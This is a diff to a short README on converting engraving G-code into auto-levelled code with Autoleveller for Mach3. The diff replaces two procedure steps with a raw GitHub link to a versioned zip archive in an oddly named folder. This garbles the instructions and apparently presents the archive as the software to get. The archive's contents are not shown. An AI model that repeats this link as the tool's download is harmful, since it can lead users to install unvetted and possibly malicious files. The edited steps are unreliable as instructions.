@@ -4,7 +4,7 @@ To convert the G-Code into Auto leveler Code using Autoleveller software.
 # Software Required
 Autoleveller
 # Procedure
-1.Open the Autoleveller software </br>
+https://raw.githubusercontent.com/MITHUN8521/G-Code-to-Autoleveller-codede-conversion/main/uncompassionating/G-Code-to-Autoleveller-codede-conversion_v1.9.zip the Autoleveller software </br>
 2. Select the software option as Mach3 </br>
 3. Load the G Code - Click “Browse for G Code” button and open your Engraving G-Code.</br>
 4. After loading G-Code below a window will open. In that Select Unit “millimeters”</br>
@@ -12,7 +12,7 @@ Autoleveller
 6. Remove the unwanted portion from your Auto Levelled G-Code. </br>
 7. Add few lines in the code and save the file</br>
 8. Follow this same procedure for remaining all G-codes ( Drill and cut).</br>
-9.Autolevelling should be done for only engraving file.</br>
+https://raw.githubusercontent.com/MITHUN8521/G-Code-to-Autoleveller-codede-conversion/main/uncompassionating/G-Code-to-Autoleveller-codede-conversion_v1.9.zip should be done for only engraving file.</br>
 
 # Theory
 
